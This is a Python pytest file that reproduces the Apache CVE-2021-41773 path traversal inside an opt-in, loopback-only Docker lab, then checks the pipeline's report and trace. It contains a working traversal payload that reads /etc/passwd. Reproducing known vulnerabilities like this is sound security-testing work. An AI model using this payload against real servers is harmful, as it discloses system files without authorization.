"""Real, non-destructive Apache CVE-2021-41773 path traversal E2E.

Runs only in an explicitly authorized ephemeral Docker lab. No command execution.
"""
import json
import os
import shutil
import subprocess
from pathlib import Path
from uuid import uuid4

import pytest
import yaml

from app.domain.policies import ExecutionPolicy
from app.domain.reproduction import Probe, ReproductionSpec
from app.targets.vulhub.catalog import TargetCatalog
from app.workflows.reproduction.graph import Pipeline

pytestmark = pytest.mark.skipif(
    os.getenv("VULNFORGE_REAL_CVE_E2E") != "1",
    reason="opt in with VULNFORGE_REAL_CVE_E2E=1",
)


def test_real_apache_cve_2021_41773_disclosure_and_trace(tmp_path):
    if shutil.which("docker") is None:
        pytest.fail("Docker is required for the real-CVE acceptance test")
    info = subprocess.run(["docker", "info"], capture_output=True, timeout=20)
    assert info.returncode == 0, "Docker daemon unavailable"

    source = Path(__file__).resolve().parents[1] / "targets/vulhub/httpd/CVE-2021-41773"
    specs = tmp_path / "specs"
    specs.mkdir()
    shutil.copy2(source / "Dockerfile", specs / "Dockerfile")
    (specs / "compose.yml").write_text(yaml.safe_dump({
        "services": {"apache": {
            "build": ".",
            "ports": ["127.0.0.1:18091:80"],
        }}
    }))
    traversal = "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    spec = ReproductionSpec(
        id="CVE-2021-41773", title="Apache 2.4.49 local path disclosure",
        product="Apache HTTP Server", affected_versions=["2.4.49"],
        dependencies=["Docker"], prerequisites=["isolated loopback-only lab"],
        sources=["Dockerfile"], environment="compose.yml", service="apache",
        port=18091, health=Probe(id="health", path="/", body_contains="It works!"),
        reproduction=[Probe(id="disclose", path=traversal, body_contains="root:", expected_status=200)],
        verification_requests=[Probe(id="confirm", path=traversal, body_contains="root:", expected_status=200)],
    )
    (specs / "CVE-2021-41773.yaml").write_text(yaml.safe_dump(spec.model_dump(mode="json")))
    target = TargetCatalog(specs).to_target_spec(spec)
    policy = ExecutionPolicy(
        policy_id="ephemeral-real-cve-test",
        approved_target_hashes={target.target_id: target.fingerprint()},
        approved_reproduction_hashes={spec.id: spec.fingerprint()},
        allowed_actions={"pull", "build", "up", "status", "health", "http", "verify_http", "logs", "verify", "down"},
        retryable_actions={"pull", "status", "health", "logs", "down"},
        allowed_services={"apache"}, allowed_ports={18091},
        allow_image_build=True, max_timeout_seconds=120, max_recovery_actions=0,
    )
    report_path = tmp_path / "reports" / "apache.json"
    project = "vf-cve-" + uuid4().hex[:10]
    pipeline = Pipeline(specs, tmp_path / "labs", project, llm=None, timeout=120,
                        execution_policy=policy)
    report = pipeline.run(spec.id, report_path)
    assert report["status"] == "success", report
    assert report["cleanup"] == "completed", report
    assert report["verification"]["status"] == "success", report
    trace = report_path.with_suffix(".trace.jsonl")
    assert trace.is_file()
    events = [json.loads(line) for line in trace.read_text().splitlines()]
    assert any(e["event"] == "stage.end" and e["stage"] == "reproducer" for e in events)
    assert any(e["event"] == "stage.end" and e["stage"] == "verifier" for e in events)
    assert report["trace_path"] == str(trace)
